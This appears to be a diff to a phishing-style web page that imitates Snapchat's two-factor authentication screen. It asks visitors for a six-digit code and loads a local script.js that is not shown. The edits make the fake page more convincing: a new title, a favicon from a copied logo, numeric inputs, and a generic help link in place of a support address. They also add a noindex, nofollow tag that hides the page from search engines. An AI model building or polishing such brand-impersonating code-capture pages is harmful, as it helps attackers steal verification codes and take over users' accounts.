@@ -3,35 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - Verify Your Code</title>
+    <title>Snapchat - Two-Factor Authentication</title>
+    <link rel="icon" type="image/png" href="Snapchat.png">
     <link rel="stylesheet" href="Snapchat.css">
+    <meta name="description" content="Verify your Snapchat account">
+    <meta name="robots" content="noindex, nofollow">
 </head>
 <body>
     <div class="container">
         <div class="language-container">
-            <button class="language-btn" onclick="toggleLanguageMenu()">🌐</button>
+            <button class="language-btn" onclick="toggleLanguageMenu()" aria-label="Change language">🌐</button>
             <div class="language-menu" id="language-menu">
-                <a href="#" onclick="setLanguage('en')">English</a>
-                <a href="#" onclick="setLanguage('fr')">Français</a>
+                <a href="#" onclick="setLanguage('en'); return false;">English</a>
+                <a href="#" onclick="setLanguage('fr'); return false;">Français</a>
             </div>
         </div>
         <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
         <h1 id="title">Two-Factor Authentication</h1>
         <p id="subtitle">Enter the 6-digit code we sent you</p>
-        <form id="codeForm">
+        <form id="codeForm" autocomplete="off">
             <div class="code-input">
-                <input type="text" name="digit1" maxlength="1" oninput="moveToNext(this, 1)" required>
-                <input type="text" name="digit2" maxlength="1" oninput="moveToNext(this, 2)" required>
-                <input type="text" name="digit3" maxlength="1" oninput="moveToNext(this, 3)" required>
-                <input type="text" name="digit4" maxlength="1" oninput="moveToNext(this, 4)" required>
-                <input type="text" name="digit5" maxlength="1" oninput="moveToNext(this, 5)" required>
-                <input type="text" name="digit6" maxlength="1" oninput="moveToNext(this, 6)" required>
+                <input type="tel" name="digit1" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 1">
+                <input type="tel" name="digit2" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 2">
+                <input type="tel" name="digit3" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 3">
+                <input type="tel" name="digit4" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 4">
+                <input type="tel" name="digit5" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 5">
+                <input type="tel" name="digit6" maxlength="1" pattern="[0-9]" inputmode="numeric" required aria-label="Digit 6">
             </div>
             <button type="submit" class="verify-btn" id="continue-btn">Continue</button>
         </form>
-        <a href="#" class="resend-link" id="resend-link" onclick="resendCode()">Resend Code</a>
+        <a href="#" class="resend-link" id="resend-link" onclick="return resendCode();">Didn't receive a code?</a>
         <p id="message"></p>
-        <p class="support-text" id="support-text">Having trouble? Contact support@snapchat.com</p>
+        <p class="support-text" id="support-text">Having trouble? Visit our Help Center</p>
     </div>
     <script src="script.js"></script>
 </body>
